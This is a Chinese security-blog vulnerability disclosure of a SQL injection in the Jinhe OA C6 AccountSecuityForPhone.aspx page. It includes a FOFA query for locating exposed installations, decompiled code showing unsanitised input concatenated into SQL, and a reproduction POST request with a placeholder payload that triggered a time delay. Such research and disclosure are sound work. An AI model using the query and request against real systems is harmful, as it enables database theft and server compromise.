---
title: "金和OA AccountSecuityForPhone.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html
asset_dir: assets/金和oa-accountsecuityforphone.aspx-sql注入漏洞
---

# 金和OA AccountSecuityForPhone.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/1 08:30
* 862浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

安全工具开发

SQL注入防护

漏洞扫描服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AccountSecuityForPhone.aspx` 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

安全研究工具

云安全解决方案

文本剥离工具

根据 AccountSecuityForPhone.aspx 的源码，在 bin 目录下查找 JHBase.Web.AddMenu.dll 将其进行反编译后找到 AccountSecuityForPhone 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.initText();
  if (!this.IsPostBack)
  {
    this.DataBind(1);
    this.ListPage1.Buttons.Add("../JHsoft.UI.Lib/images/icon.toolbar/16px/delete.png", this.CancelSecuity);
  }
  this.ListPage1.PageChange += new DataGridPage.EventHandler(this.ListPage1_PageChange);
  this.ListPage1.ButtonClick += new UserWebControl.DataGrid.DataGrid.ButtonEventHandler(this.ListPage1_ButtonClick);
}
private void ListPage1_ButtonClick(object sender, string ButtonName)
{
  if (!string.op_Equality(ButtonName, this.CancelSecuity))
    return;
  if (this.account.CancelSecuity(this.ListPage1.Value) > 0)
  {
    this.DataBind(1);
    this.RegisterStartupScript("", $"<script>openAlertDialog('{this.strCancelOk}！','ok'); </script>");
  }
  else
    this.RegisterStartupScript("", $"<script>openAlertDialog('{this.strCancelErr}！','error'); </script>");
}
```

深入探索

防火墙软件

在线安全工具

网页浏览器

查询按钮查询时，会将**txtUser**带入`ListPage1_ButtonClick`方法，然后执行`DataBind`方法，跟进 `DataBind` 方法

```
private void DataBind(int pageNo)
{
  string strWhere = string.Empty;
  if (string.op_Inequality(((HtmlInputControl) this.txtUser).Value.Trim(), ""))
    strWhere = $" and username like '%{((HtmlInputControl) this.txtUser).Value.Trim()}%'";
  DataSet secuityData = this.account.GetSecuityData(strWhere, this.PageSize, pageNo);
```

参数 `txtUser` 被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.addmenu/AccountSecuityForPhone.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=YOUR___VIEWSTATE&txtUser=SQLI_POC&btnSearch=%E6%9F%A5%E8%AF%A2&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&__EVENTTARGET=&__EVENTARGUMENT=
```

[![金和OA AccountSecuityForPhone.aspx SQL注入漏洞](images/img-001-243cc59ded6f.webp)](https://image.mrxn.net/fc77815d36ba4007a0fbc21f1d2fe2d1.webp)

成功延时 5 秒

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AccountSecuityForPhone.aspx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-addmenu-AccountSecuityForPhone-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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